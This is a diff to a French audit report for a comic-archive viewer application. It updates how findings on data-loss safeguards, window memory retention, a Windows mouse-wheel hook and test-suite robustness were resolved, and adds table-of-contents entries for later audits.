@@ -23,6 +23,9 @@ Il est conçu pour être lu sans accès aux conversations dans lesquelles les au
 8. [Audit 8 — Fuites mémoire et cycle de vie des fenêtres (version 1.9.0)](#audit-8--fuites-mémoire-et-cycle-de-vie-des-fenêtres-version-190)
 9. [Audit 9 — Journal des erreurs : couverture, robustesse, confidentialité et exploitabilité (version 1.9.1)](#audit-9--journal-des-erreurs--couverture-robustesse-confidentialité-et-exploitabilité-version-191)
 10. [Audit 10 — Qualité, pertinence et couverture réelle de la suite de tests (version 1.9.1)](#audit-10--qualité-pertinence-et-couverture-réelle-de-la-suite-de-tests-version-191)
+11. [Audit 11 — Sécurité globale : dépendances, processus externes, réseau, secrets, distribution (version 1.10.0)](#audit-11--sécurité-globale--dépendances-processus-externes-réseau-secrets-distribution-version-193)
+12. [Consolidation des tests — lacunes restantes des audits 4 à 11 (version 1.10.0)](#consolidation-des-tests--lacunes-restantes-des-audits-4-à-11-version-193)
+13. [Audit 12 — Fuzzing ciblé : noms, fichiers malformés, PDF, ComicInfo.xml, enchaînements (version 1.1.0)](#audit-12--fuzzing-ciblé--noms-fichiers-malformés-pdf-comicinfoxml-enchaînements-version-193)
 
 ---
 
@@ -414,7 +417,7 @@ Tous les correctifs recommandés par le rapport initial ont été appliqués, da
 |---|---|---|---|
 | **P0** — perte ou corruption de données | 5 | 5 Confirmed (4 reproduits) | 5 corrigés |
 | **P1** — risque sérieux de perte | 4 | 4 Confirmed | 4 corrigés |
-| **P2** — comportement destructif incorrect mais récupérable | 10 | 4 Confirmed, 6 Possible | 6 corrigés, 4 non corrigés (décision de l'utilisateur) |
+| **P2** — comportement destructif incorrect mais récupérable | 10 | 4 Confirmed, 6 Possible | 7 corrigés (P2-6 ensuite, en 1.10.0), 3 non corrigés (décision de l'utilisateur ou comportement de Windows) |
 | **P3** — robustesse | 5 | 2 Confirmed, 3 Possible | 5 corrigés |
 | **P4** — maintenabilité | 5 | — | 3 corrigés, 2 partiellement traités (reste reporté) |
 | **Constats ajoutés pendant les corrections** | 8 | Confirmed | 8 corrigés (plus 1 message non reproduit) |
@@ -542,7 +545,7 @@ Tous les correctifs recommandés par le rapport initial ont été appliqués, da
 | **P2-3** | « Restaurer l'original » revient à l'état d'avant le premier clic de l'outil et efface aussi les retouches d'autres outils faites ensuite. | Confirmed | **Non corrigé** : comportement voulu (décision de l'utilisateur). | — |
 | **P2-4** | Annuler/Refaire ne vidait pas l'image PIL en mémoire (`entry["img"]`) des pages non affichées ; une retouche suivante pouvait repartir d'une image périmée. | Possible (confirmé réel par l'utilisateur) | **Corrigé** : `undo_redo_qt._reload_thumb_qt` appelle `free_image_memory(entry)`. | Manuel |
 | **P2-5** | Pendant une opération en arrière-plan, seuls Annuler/Refaire étaient bloqués ; suppression, réordonnancement, déplacement et sauvegarde restaient possibles. | Possible | **Corrigé** : `panel_widget.BUSY_BLOCKED_COMMANDS` (commandes sans effet et grisées dans la barre de menus et les menus contextuels), `icon_toolbar_qt._BUSY_BLOCKED_ICONS`, gardes directes (Ctrl+O, dépôt, Suppr, Ctrl+X/V, glisser-déposer interne et entre panneaux, outils de la visionneuse, macros). | `test_operation_running.py` (clés existantes) |
-| **P2-6** | Fin de conversion de format : le choix « supprimer les originaux / les converties » est appliqué sans vérifier que les pages converties sont toujours là. | Possible | **Non corrigé** (décision de l'utilisateur ; récupérable par Annuler). | — |
+| **P2-6** | Fin de conversion de format : le choix « supprimer les originaux / les converties » est appliqué sans vérifier que les pages converties sont toujours là. | Possible | **Corrigé** (version 1.10.0). Le scénario n'était déjà plus possible depuis l'Audit 3, P1-2 : le document reste verrouillé tant que la question est affichée (suppression, couper, Annuler, déplacement vers l'autre panneau, glisser dans la mosaïque bloqués). Défense ajoutée contre une future commande qui oublierait ce verrou : `show_conversion_complete_dialog._handle_action` (« Supprimer les originaux ») ne retire que les originaux dont la page convertie est encore dans le document (`_originals_with_their_conversion`, originaux et pages converties associés deux à deux). Le cas protégé ne peut pas être provoqué dans l'application ; l'usage normal (supprimer les originaux, échec partiel, annuler la conversion, garder les deux, Annuler/Refaire, verrou pendant la question) a été vérifié manuellement, sans changement. | `test_format_conversion_flow.py` (2 tests). Manuel, validé |
 | **P2-7** | Jointure avec la renumérotation désactivée : « Oui, supprimer les sources » ignoré. | Confirmed | **Corrigé** : les sources sont retirées avant l'insertion de la planche. | Manuel |
 | **P2-8** | Déplacement entre panneaux : deux historiques indépendants ; Annuler dans la destination ne rend pas les pages à la source. | Possible | **Non corrigé** (décision de l'utilisateur). | — |
 | **P2-9** | Conversions de `_write_apply_new_names` : rien n'empêchait de choisir l'original lui-même comme destination ; il était écrasé, puis proposé à la suppression. | Possible | **Corrigé** : `_is_conversion_source` (`is_same_path`, message `messages.errors.convert_target_is_source`) dans les branches CBR/CB7/CBT/EPUB et PDF. Les tests de l'utilisateur ont montré que le cas réel passait par `save_as_cbz` (icône Enregistrer sur un CBR non modifié, nom du CBR saisi dans la fenêtre Windows) : même refus ajouté dans `save_as_cbz` quand le fichier ouvert n'est pas un CBZ. | Manuel |
@@ -714,7 +717,7 @@ Tous les correctifs P0 et P1 recommandés ont été appliqués, puis les P2 rete
 
 1. **P4-1** — une seule source de règles pour lire les archives (session dédiée).
 2. **P4-4** — garde contre les `except Exception: pass` hors boucle : corrigé en 1.8.11 (sites relus et marqués, 14 sites corrigés, test de garde `test_check_no_silent_pass.py`).
-3. **P2-3, P2-6, P2-8** — non corrigés par décision de l'utilisateur ; **P2-10** — comportement de Windows.
+3. **P2-3, P2-8** — non corrigés par décision de l'utilisateur ; **P2-10** — comportement de Windows. P2-6 corrigé ensuite (version 1.10.0).
 4. **Coût de la Bibliothèque cachée au changement de thème** (C-7) — laissé tel quel : la fenêtre est gardée vivante volontairement.
 
 ---
@@ -817,7 +820,7 @@ Tous les correctifs P0 et P1 recommandés ont été appliqués, puis les P2 rete
 - **Scénario** : action X (recadrage) → conversion → la question s'affiche → Ctrl+Z → réponse.
 - **Comportement constaté** : Ctrl+Z défaisait la conversion **et** X ; la réponse appelait `save_state()`, qui coupait la branche Refaire : X était irrécupérable.
 - **Correction** : la conversion reste inscrite jusqu'à la réponse (`awaiting_choice`) ; `_after_complete` pousse l'état puis appelle `end_operation`. Fermer la fenêtre vaut « Garder les deux » (son `closeEvent` rappelle l'action), le verrou est donc toujours libéré. `_after_complete` est sans effet si le document a changé (C-5).
-- **Tests** : test manuel, validé. **Lien** : Audit 2, P2-6 (même fenêtre, autre défaut : choix appliqué sans vérifier que les pages converties existent encore — non corrigé par décision de l'utilisateur).
+- **Tests** : test manuel, validé. **Lien** : Audit 2, P2-6 (même fenêtre, autre défaut : choix appliqué sans vérifier que les pages converties existent encore — rendu impossible par cette correction, puis corrigé en défense en version 1.10.0).
 
 ### P1-3 · Six ajouts sans état d'historique « après » eux
 
@@ -985,21 +988,21 @@ Examen ciblé, demandé après un défaut découvert par hasard et corrigé avan
 **Le correctif de la molette** (`_foreign_window_at` : processus de la fenêtre racine sous le curseur comparé à celui de l'application)
 - **Cause** : le hook relaie la molette au combo quand la fenêtre de l'application est inactive ; le seul contrôle de recouvrement (`QApplication.widgetAt`) ne connaît que les fenêtres Qt de l'application, et une fenêtre d'un autre programme posée dessus lui échappait.
 - **Verdict** : correction à la source pour les fenêtres des autres programmes, sans régression trouvée.
-- **Reste ouvert** (**Confirmé par le code**, non reproduit, laissé en l'état par décision de l'utilisateur et noté dans son fichier d'idées) : une fenêtre native Windows ouverte par l'application elle-même (Ouvrir / Enregistrer sous de `QFileDialog`, impression) n'est ni une fenêtre Qt ni d'un autre processus ; posée sur le combo, elle n'arrête pas la molette. Correction possible : comparer la fenêtre racine sous le curseur à celle du combo.
+- **Reste ouvert, corrigé ensuite (E-2)** : une fenêtre native Windows ouverte par l'application elle-même (Ouvrir / Enregistrer sous de `QFileDialog`, impression, pilote de scanner) n'est ni une fenêtre Qt ni d'un autre processus ; posée sur le combo, elle n'arrêtait pas la molette. Les deux contrôles (processus, `widgetAt`) sont remplacés par un seul : `_root_window_at` (fenêtre racine sous le curseur, `GetAncestor(WindowFromPoint(...), GA_ROOT)`) doit être celle du combo (`target.window().winId()`). Les tooltips (`OverlayTooltip`, enfants sans fenêtre Windows propre) ne changent pas cette fenêtre racine.
 
 **Constats**
 
 | # | Certitude | Constat | Statut |
 |---|---|---|---|
 | **E-1** | Confirmé (code) | Défilement du hook arrondi par `delta // 120 * 120`, qui arrondit vers −∞ : un petit delta de pavé tactile ne faisait rien vers le haut et un cran entier vers le bas (combo des langues, fenêtre inactive). | **Corrigé** : deltas cumulés dans `WheelHook._wheel_accum` jusqu'à un cran entier, tronqués vers zéro (`int(... / 120)`). Manuel. |
-| **E-2** | Confirmé (code) | Fenêtres natives Windows de l'application posées sur le combo (voir ci-dessus). | Non traité (décision de l'utilisateur). |
+| **E-2** | Confirmé (code) | Fenêtres natives Windows de l'application posées sur le combo (voir ci-dessus). | **Corrigé** : fenêtre racine sous le curseur comparée à celle du combo (`_root_window_at`). Manuel, validé. |
 | **E-3** | Hypothèse | Le hook voit passer toutes les molettes du système et a besoin du verrou de l'interpréteur Python : une application très occupée pourrait ralentir la molette dans les autres programmes, ou Windows retirer le hook (`LowLevelHooksTimeout`). Aucun symptôme observé. | Non traité. |
 
 **Sans problème trouvé** : raccourcis clavier (actifs seulement dans la fenêtre principale ; après correction du conflit de la barre de menus, voir ci-dessous), changement de panneau actif, navigation Tab, tooltips et survols (Windows n'envoie pas de survol à une fenêtre recouverte), glisser-déposer.
 
 **Constat lié, corrigé pendant les tests de P4-3** : `QAction::event: Ambiguous shortcut overload: Ctrl+Z` dans la console. Les entrées de la barre de menus portaient un raccourci actif (Ctrl+Z, Ctrl+Y, Ctrl+C…) en concurrence avec le raccourci global de la fenêtre dès que le menu avait été ouvert une fois ; Qt n'en déclenchait alors aucun (Annuler sans effet, historique intact — confirmé par des prints). Correction : `menubar_qt._add_action` pose `Qt.WidgetShortcut`, le raccourci n'est plus qu'affiché dans le menu. Manuel, validé.
 
-**Tests** : aucun test automatique. Le hook dépend de vraies fenêtres Windows et d'événements système ; un test fiable n'est pas possible sans extraire la règle de décision en fonction pure. Vérifications manuelles : molette dans l'Explorateur posé sur le combo ; molette au pavé tactile sur le combo pendant qu'une autre fenêtre est active.
+**Tests** : aucun test automatique. Le hook dépend de vraies fenêtres Windows et d'événements système ; un test fiable n'est pas possible sans extraire la règle de décision en fonction pure. Vérifications manuelles : molette dans l'Explorateur, dans la boîte Ouvrir de l'application et dans une fenêtre de l'application posés sur le combo ; molette sur le combo avec son tooltip affiché ; molette au pavé tactile sur le combo pendant qu'une autre fenêtre est active.
 
 ---
 
@@ -2244,7 +2247,7 @@ Six nouvelles clés (`comicvine.api_key_dialog.error_save` ; `messages.errors.co
 | **P1** | 1 | Confirmed (reproduit dans l'application) | Corrigé (tests automatiques ; mesure dans l'application) |
 | **P2** | 1 | Confirmed par le code | Corrigé et validé dans l'application (test automatique) |
 | **P3** | 5 | 3 Confirmed, 2 Very likely | Tous corrigés et validés dans l'application (P3-2 sauf les menus de la Bibliothèque, non vérifiés) |
-| **P4** | 4 | 4 Confirmed | P4-1 à P4-3 corrigés ; P4-4 en partie (nouveaux garde-fous) |
+| **P4** | 4 | 4 Confirmed | P4-1 à P4-3 corrigés ; P4-4 en partie (nouveaux garde-fous ; taille de l'historique non retenue) |
 | **Constats ajoutés pendant les corrections** | 12 | C-2, C-4, C-5, C-6, C-9, C-12 confirmés par print ; C-11 par la trace de l'utilisateur ; les autres par le code | C-1 à C-9 et C-11 corrigés et validés ; C-10 : incident de méthode, réparé ; C-12 : défaut extérieur (API ComicVine), non corrigé |
 
 **Constat principal** : dans `modules/qt/`, **50 classes de fenêtres** (sur 80 sous-classes de `QDialog`) ne sont jamais détruites : ni `WA_DeleteOnClose`, ni `deleteLater` sur elles-mêmes, et leur point d'entrée ne fait que `show()`. Fermer une de ces fenêtres la **masque** ; elle reste enfant Qt de son parent — panneau, fenêtre principale ou fenêtre de la Bibliothèque, qui vivent toute la session — avec tout ce qu'elle référence. Chaque ouverture en crée une nouvelle. Le plus souvent la rétention est modeste (textes, widgets), mais plusieurs de ces fenêtres gardent des images : la fenêtre de jointure (P1-1), la création d'icône, le GIF animé, le redimensionnement (P2-1), les fenêtres de macros, qui retiennent la visionneuse fermée (P3-1).
@@ -2318,7 +2321,7 @@ Aucun. Aucune rétention trouvée ne menace l'intégrité des données : les fen
 | `comicinfo_dialog_qt._ComicInfoDialog`, `nfo_dialog_qt._NfoDialog`, `comicvine_update_check_qt._UpdateDiffDialog`, `duplicate_detection_qt._DuplicatesWindow` | page éditée, `state` ; depuis la Bibliothèque (`LibraryWindow`, parent permanent), l'`AppState` virtuel de chaque comic édité | faible à moyenne |
 | `scan_dialog_qt.ScanDialog`, `web_import_qt.WebImportDialog`, `batch_drop_dialog_qt.BatchDropDialog`, `macro_tool_qt` (4 fenêtres, voir P3-1), `text_tool_qt._ColorPickerDialog` (parent : la visionneuse, détruite avec elle) | widgets, rappels | faible |
 | `user_guide_qt._HelpDialog`, `_ExportSuccessDialog`, `changelog_dialog_qt._ChangelogDialog` (tout le CHANGELOG mis en forme), `license_dialog_qt._LicenseDialog`, `_FullLicenseDialog` (texte complet d'une licence), `donation_dialog_qt._DonationDialog`, `distillat_dialog_qt._DistillatDialog`, `update_checker_qt._UpdateDialog`, `comicvine_apikey_dialog_qt._ApiKeyDialog` | arbre de widgets (le mode d'emploi en compte plusieurs centaines), textes | faible par ouverture |
-| `batch_dialogs_qt` : `_ConfirmDialog`, `_ProgressDialog`, 6 fenêtres de résumé, `_ImgModeDialog`, `_RecompressConfirmDialog` ; `batch_metadata_dialog_qt` : `_MetadataConfirmDialog`, `_MetadataSummaryDialog`, `_CancelConfirmDialog` ; `deskew_qt._DeskewSummaryDialog` ; `pdf_loading_qt._MsgDialog`, `PdfSuccessDialog` ; `pdf_unlock_qt._PdfUnlockedSuccessDialog` | trois fenêtres par lot, listes d'erreurs et de renommages | faible |
+| `batch_dialogs_qt` : `_ConfirmDialog`, `_ProgressDialog`, 6 fenêtres de résumé, `_ImgModeDialog`, `_RecompressConfirmDialog` ; `batch_metadata_dialog_qt` : `_MetadataConfirmDialog`, `_MetadataSummaryDialog`, `_CancelConfirmDialog` ; `deskew_qt._DeskewSummaryDialog` ; `pdf_loading_qt._MsgDialog`, `PdfSuccessDialog` (supprimée depuis : jamais ouverte, code mort) ; `pdf_unlock_qt._PdfUnlockedSuccessDialog` | trois fenêtres par lot, listes d'erreurs et de renommages | faible |
 | `library_dialogs` : `NewDbDialog`, `RenameDbDialog`, `ConfirmDeleteDialog` | voir P3-4 | faible |
 
 Aussi : `archive_loader._MessageDialog` (message d'erreur de chargement) et `icon_toolbar_qt._IconConfigDialog` (configuration de la colonne d'icônes, dont le `deleteLater` ne vise que les cellules de sa grille ; garde son cache de vignettes `_photo_cache`).
@@ -2375,7 +2378,7 @@ Aussi : `archive_loader._MessageDialog` (message d'erreur de chargement) et `ico
 - **P4-1** — Corrigé (tests automatiques de la suite ; non vérifié dans l'application, ComicVine ne répondant pas pendant le test) : `_ComicVineDialog._dying_workers` supprimé ; `_park_running_worker` confie un worker encore actif à `park_qthread` (`utils.py`), qui le libère dès la fin réelle de son thread (minuteur), et `_BatchMetadataOrchestrator._rescue_dlg_workers` n'a plus à sauter un worker déjà parqué (`park_qthread` n'en garde qu'une référence). Une des « six manières de garder un worker en vie » de l'Audit 4, P4-2, disparaît.
 - **P4-2** — Corrigé : `temp_files.cleanup_all_temp_files(keep_logs=True)` (fermeture de l'application) supprime les journaux `Log_*.txt` de plus de `LOG_MAX_AGE_DAYS` jours (30, d'après la date de modification ; âge illisible : journal gardé). Test : `tests/test_temp_files_logs.py` (`test_closing_removes_logs_older_than_the_limit`).
 - **P4-3** — Corrigé : vérification complète avant suppression — aucune mention ailleurs que sa définition (tous les fichiers du dépôt), aucun accès indirect (`import *`, `__all__`, `getattr` à nom variable, `vars()`/`globals()`/`__dict__`, nom construit), jamais lue d'après l'AST de `state.py`, et déjà inutilisée dans le commit initial. La ligne et son commentaire sont retirés de `state.py`. Sans effet constaté : suite complète passée (1051 tests, dont `test_check_internal_imports.py`), parcours ordinaire de l'application sans erreur.
-- **P4-4** — En partie : destruction des fenêtres, libération des images de la jointure et destruction des menus ont désormais leurs garde-fous (`test_check_dialogs_destroyed.py`, `test_merge_dialog_memory.py`, `test_check_context_menus_deleted.py`) ; rien pour la taille de l'historique.
+- **P4-4** — En partie : destruction des fenêtres, libération des images de la jointure et destruction des menus ont désormais leurs garde-fous (`test_check_dialogs_destroyed.py`, `test_merge_dialog_memory.py`, `test_check_context_menus_deleted.py`) ; rien pour la taille de l'historique. **Taille de l'historique : non retenu (choix de l'utilisateur).** Un budget de mémoire (oubli des plus anciens états au-delà d'une taille) a été proposé puis écarté : il ferait perdre des annulations sans prévenir, risque jugé plus grave que la mémoire consommée. L'historique garde ses 20 états, quelle que soit leur taille.
 
 ---
 
@@ -2963,7 +2966,7 @@ Lots A, B et C faits, ainsi que P4-1 : tous les constats P1 à P3, P4-1, C-1 à 
 | **P0** — aucun test contre une perte de données | 5 | 5 Confirmed (aucun test ni garde-fou, vérifié par lecture) | Tous corrigés (tests et garde-fous ajoutés) |
 | **P1** — risque important non couvert | 7 | 6 Confirmed, 1 Possible | Tous corrigés (tests et garde-fous), dans un second temps, après les P0 |
 | **P2** — fonctionnalité insuffisamment testée | 8 | Confirmed | Tous corrigés (tests) |
-| **P3** — robustesse des tests | 6 | 4 Confirmed, 2 Very likely | P3-1, P3-2, P3-4, P3-5 corrigés ; P3-3 traité pour les nouveaux tests ; P3-6 accepté |
+| **P3** — robustesse des tests | 6 | 4 Confirmed, 2 Very likely | P3-1 à P3-5 corrigés ; P3-6 accepté |
 | **P4** — maintenabilité | 4 | — | Non corrigés |
 | **Constats ajoutés pendant les corrections** (code de l'application) | 9 | 8 Confirmed, 1 Very likely | Tous corrigés |
 
@@ -2995,7 +2998,7 @@ Lots A, B et C faits, ainsi que P4-1 : tous les constats P1 à P3, P4-1, C-1 à 
 - **Mutations non détectées** : retirer la ligne `verify_written_cbz(...)` d'une des trois fermetures ; placer la relecture après `_safe_delete` dans `_convert_file_to_cbz`.
 - **Comportement attendu** : l'original n'est supprimé qu'après la relecture réussie du CBZ ; sinon il est gardé et le document repasse à « modifié » (`_mark_save_unverified`).
 - **Correction** : règle 4 de `test_check_atomic_file_writes.py`. Pour chaque fichier de `SOURCE_DELETERS` (panneaux, Bibliothèque, lots, import de métadonnées), toute suppression de la source d'une conversion — mise à la Corbeille (`_safe_delete`, `safe_delete`, `send_to_trash`, `callbacks['safe_delete_file']`) ou `os.remove` du même chemin — doit être **précédée**, dans la fonction la plus proche, d'une relecture. Le test vérifie aussi que son scan voit toujours au moins le nombre attendu de suppressions (18), et un auto-contrôle (`test_reread_rule_detects_a_missing_or_late_check`) prouve qu'il détecte une relecture absente ou tardive. La suppression des bases de la Bibliothèque (`_on_delete_accepted`) est écartée par `NOT_A_CONVERSION`.
-- **Non fait** : une fonction pure « supprimer la source si le CBZ se relit » testée fonctionnellement — elle demanderait de sortir ces fermetures des fonctions Qt (refonte, voir P4-4).
+- **Complété en 1.10.0** : la fonction pure « relire puis supprimer la source » existe et est testée fonctionnellement (`converted_cbz.reread_then_delete_source`, `test_converted_cbz.py`) ; les fermetures du panneau et de la Bibliothèque l'appellent (voir P4-4).
 - **Renvoi** : Audit 2, tests toujours manquants (« relecture avant suppression dans les fins différées »).
 
 ### P0-2 · Six boucles de lot qui suppriment ou remplacent des fichiers n'étaient jamais exécutées
@@ -3106,7 +3109,7 @@ Tests seulement, sans modification du code de l'application. Les fonctions des m
 |---|---|---|
 | P3-1 | Tests sautés en silence : `Rar.exe` à un chemin fixe (`test_altered_pages.py`), `importorskip` de `pymupdf` et `tifffile`, `7z.exe`. Le critère de `RELEASE.txt` est « tous PASSED » ; un test sauté n'échoue pas, et `run_tests.py` ne liste pas les tests sautés. | **Corrigé** : `run_tests.py` pose `MOSAICVIEW_TESTS_NO_SKIP` et passe `-ra` ; `conftest.pytest_sessionfinish` fait alors échouer la suite (code de sortie 1, message) si un test a été sauté. `python -m pytest tests` garde les sauts permis. Règle ajoutée à `RELEASE.txt` et `CLAUDE.md` |
 | P3-2 | `test_library_db.py` : `time.sleep(1.1)` pour faire avancer la date de modification ; `test_config_manager.py` : `sleep(0.05)` | **Corrigé** : date de modification posée par `os.utime` ; le test de la configuration compare aussi le contenu du fichier |
-| P3-3 | Extraction AST avec espace de noms monté à la main (30 fichiers) : une dépendance ajoutée plus tard lève `NameError`, et dans un `except Exception:` de repli le test vérifie le repli sans le savoir (relevé par l'Audit 1) | **Traité pour les nouveaux tests** : `tests/ast_loader.py` (`load(module, noms, **dépendances)`) refuse, avant exécution, tout nom global lu par les définitions extraites et absent de l'espace de noms, des définitions extraites et des fonctions intégrées. Étendue ensuite aux affectations annotées et aux méthodes de classe (`load_methods`). Les 30 fichiers existants n'ont pas été migrés : chacun monte son espace de noms à sa façon, la conversion de tous risquait de casser des tests fiables pour un gain faible. Migration au fil des modifications, imposée par `tests/test_check_ast_extraction.py` : un nouveau fichier qui extrait à la main échoue, et la liste `LEGACY` des 30 anciens ne fait que raccourcir (un fichier migré doit en être retiré) ; règle ajoutée à `CLAUDE.md` |
+| P3-3 | Extraction AST avec espace de noms monté à la main (30 fichiers) : une dépendance ajoutée plus tard lève `NameError`, et dans un `except Exception:` de repli le test vérifie le repli sans le savoir (relevé par l'Audit 1) | **Traité pour les nouveaux tests** : `tests/ast_loader.py` (`load(module, noms, **dépendances)`) refuse, avant exécution, tout nom global lu par les définitions extraites et absent de l'espace de noms, des définitions extraites et des fonctions intégrées. Étendue ensuite aux affectations annotées et aux méthodes de classe (`load_methods`). Les 30 fichiers existants n'ont pas été migrés : chacun monte son espace de noms à sa façon, la conversion de tous risquait de casser des tests fiables pour un gain faible. Migration au fil des modifications, imposée par `tests/test_check_ast_extraction.py` : un nouveau fichier qui extrait à la main échoue, et la liste `LEGACY` des 30 anciens ne fait que raccourcir (un fichier migré doit en être retiré) ; règle ajoutée à `CLAUDE.md`. En 1.10.0, 4 fichiers migrés avec la refonte de P4-4 (`test_batch_zip_writer.py`, `test_batch_metadata_save.py`, `test_audit7_p3.py`, `test_error_reporting.py`) et `load_methods` étendu aux constantes de classe (`class_attrs`, 2 tests dans `test_check_ast_extraction.py`) ; la migration de `test_error_reporting.py` a révélé trois fonctions du chargeur d'archives que l'ancienne extraction ne fournissait pas (`_get_7z_exe`, `_to_short_path`, `_tar_info_read`, non appelées par ces tests). **Corrigé** (1.10.0) : les 26 fichiers restants migrés, sans changer ce que vérifie chaque test ; liste `LEGACY` supprimée, le garde-fou refuse toute extraction à la main ; aucun cas restant à justifier. `ast_loader.load_inner(module, ("Classe", "méthode"), noms, **dépendances)` ajouté pour une fonction définie dans une méthode (`_copy_entry` de `PanelWidget._on_inter_panel_drop`, `test_altered_pages.py` ; 2 tests dans `test_check_ast_extraction.py`) ; `test_comicvine_series_part.py` ne modifie plus de nœud (`load_methods` garde `@staticmethod`). Le contrôle des dépendances a trouvé : `test_password_protected_cb7_reports_every_page` (`test_batch_copy_pages.py`) sans `threading` ni `_check_member_size`, chaque page échouait sur `NameError` et non sur le mot de passe — le test passait sans rien prouver ; une fois exécutée pour de vrai, la lecture a révélé C-10 ; `test_clipboard_unreadable_pages.py` sans `zipfile` ni `AlteredMemberError` (la page au CRC faux était illisible par `NameError`, rattrapé par la boucle du test ; même résultat avec les vraies dépendances) ; `test_archive_member_reading.py` (mêmes noms, branche non exécutée) et `test_batch_metadata_cancel.py` (`_wt`, `exception_text`, branches d'erreur non exécutées) |
 | P3-4 | Garde-fous sans auto-contrôle (`test_check_no_modal`, `test_check_internal_imports`, `test_check_single_trash`, `test_check_no_swallowed_loop_errors`, `test_check_no_shared_pdf_process`, `test_check_tests_isolated`) : un scan qui ne trouve plus rien passe. `test_check_no_modal` ne voit pas les API statiques modales (`QMessageBox.question`, `QInputDialog.get*`, `QColorDialog.getColor`), aujourd'hui absentes du code | **Corrigé** : chacun des cinq garde-fous de scan a un test qui lui fait trouver un cas fautif écrit pour l'occasion (et admettre les cas permis), et un test qui vérifie qu'il parcourt bien tout le paquet ; `test_check_no_modal` voit en plus `QMessageBox`, `QInputDialog`, `QColorDialog` et `QFontDialog` statiques (`STATIC_MODAL`, boîtes de fichiers natives toujours admises). `test_check_tests_isolated` n'est pas un scan (vrais process) : sans objet |
 | P3-5 | `BatchClaims.start(...)` appelé sans `finish()` dans deux tests (`test_error_reporting.py`, `test_batch_metadata_cancel.py`) : lots laissés dans `batch_claims._running`, sans effet aujourd'hui (`tmp_path` unique) | **Corrigé** : ces deux tests terminent le lot qu'ils démarrent ; fixture automatique de `conftest.py` qui termine, après chaque test, tout lot resté en cours |
 | P3-6 | Vrais process et verrous `msvcrt` (`test_error_log.py`, `test_pdf_probe.py`) : lents, propres à Windows, justifiés | Accepté |
@@ -3117,8 +3120,8 @@ Tests seulement, sans modification du code de l'application. Les fonctions des m
 |---|---|---|
 | P4-1 | Couplage au texte du code : `test_comicvine_park_worker.py` (positions dans `ast.unparse`), `test_viewer_closed_image.py` (cherche `img.copy()`), attendus `"record_action('save'"` de `test_error_log_capture.py`. Justifié pour une règle d'architecture, fragile pour un comportement | **Corrigé** pour les deux tests de comportement : `test_comicvine_park_worker.py` (5 tests) exécute la mise à l'écart d'un worker encore actif, slots débranchés et worker gardé vivant ; `test_viewer_closed_image.py` (3 tests) exécute `ImageViewer._display_single_page` sur une image fermée (page affichée depuis ses octets, page inchangée), une page sans octets et une page ordinaire. Les attendus de `test_error_log_capture.py` restent : ils vérifient une règle d'architecture |
 | P4-2 | Duplication : chargeurs AST `_nodes`, faux `_Signal`/`_Progress` réécrits fichier par fichier | **Corrigé** : `tests/fakes.py` (faux signal Qt, fausse traduction) remplace les copies de 10 fichiers ; `test_batch_metadata_cancel.py` garde la sienne (débranchement différent). Les chargeurs AST relèvent de P3-3 |
-| P4-3 | Coût : chaque garde-fou relit tout `modules/qt/` (déjà relevé par l'Audit 5) ; la suite dure environ 110 s | **Corrigé** : `ast_loader.module_tree(path)` analyse chaque fichier une fois pour toute la suite (cache invalidé si la date ou la taille change) ; 13 garde-fous l'utilisent. L'arbre est partagé, donc lu seulement : un test qui modifie un nœud (`test_comicvine_series_part.py`) garde son propre `ast.parse` |
-| P4-4 | Code dupliqué qui multiplie la surface non testée : branches CBR/CB7/CBT/EPUB et PDF presque identiques dans `_write_apply_new_names` ; six boucles de lot qui répètent « écrire → relire → supprimer ». Renvoi Audit 1, P4-1 | **Non retenu** : refonte de l'application, hors du périmètre d'un audit des tests ; les boucles sont couvertes par `test_batch_loops.py` (P0-2) |
+| P4-3 | Coût : chaque garde-fou relit tout `modules/qt/` (déjà relevé par l'Audit 5) ; la suite dure environ 110 s | **Corrigé** : `ast_loader.module_tree(path)` analyse chaque fichier une fois pour toute la suite (cache invalidé si la date ou la taille change) ; 13 garde-fous l'utilisent. L'arbre est partagé, donc lu seulement : un test qui modifie un nœud fait son propre `ast.parse` |
+| P4-4 | Code dupliqué qui multiplie la surface non testée : branches CBR/CB7/CBT/EPUB et PDF presque identiques dans `_write_apply_new_names` ; six boucles de lot qui répètent « écrire → relire → supprimer ». Renvoi Audit 1, P4-1 | **Corrigé** (version 1.10.0, d'abord non retenu) : séquence écrite une seule fois dans `modules/qt/converted_cbz.py`, sans Qt. `write_cbz` écrit dans un temporaire, contrôle la structure ou relit entièrement, puis donne son nom ; `delete_source` supprime l'original et refuse si ce CBZ n'a pas été relu avant de prendre son nom ; `reread_then_delete_source`, pour un CBZ déjà nommé (panneau, Bibliothèque), relit puis supprime. Branchés : les six lots (`_interruptible_zip_writer` n'est plus qu'une enveloppe de `write_cbz`, `_InterruptibleZip` retiré), l'import de métadonnées (son écrivain et `_CancellableZip` retirés), « Enregistrer sous », la conversion d'« Appliquer » (les deux branches fusionnées) et la Bibliothèque (`file_operations_qt._safe_delete` et la clé `safe_delete_file` des callbacks retirées). 27 tests de comportement sur de vrais fichiers (`test_converted_cbz.py`). Garde-fou `test_check_atomic_file_writes.py` : une conversion ne supprime sa source que par ces fonctions, `delete_source(w, …)` exige un écrivain qui relit refermé avant l'appel, tout appel à `write_cbz` relit ou contrôle la structure, chaque règle avec son auto-contrôle. Défauts relevés en route et corrigés : un original impossible à supprimer donnait une ligne vide au journal de l'import de métadonnées (`exception_text`, pile au journal des erreurs) ; panneau et Bibliothèque supprimaient l'original sans vérifier que le CBZ n'avait pas été réécrit ailleurs pendant la question « Supprimer l'original ? » (signature comparée, `ConvertedCbzChangedError`, message `messages.errors.converted_cbz_changed` traduit dans toutes les langues). Fichiers de test migrés vers `ast_loader` : `test_batch_zip_writer.py`, `test_batch_metadata_save.py`, `test_audit7_p3.py`. Suite : 1469 tests |
 
 ---
 
@@ -3196,6 +3199,14 @@ Problèmes de l'application relevés en écrivant les tests ; les deux premiers 
 - **Constat** : l'envoi par mail du journal des erreurs ou du journal des numérisations copie le journal dans le presse-papiers et ouvre le client mail avec une consigne de collage (Ctrl+V). Le client place le curseur au début du corps, devant la consigne : le journal collé finissait sur la même ligne que la consigne, qui lui restait accolée. Les deux retours à la ligne du corps `mailto:` placés après la consigne n'y changeaient rien.
 - **Correction** : fonction commune `copy_log_for_mail`, qui copie le journal suivi d'exactement deux retours à la ligne, appelée par les deux envois. Le bouton « Copier » de la fenêtre du journal copie toujours le journal tel quel.
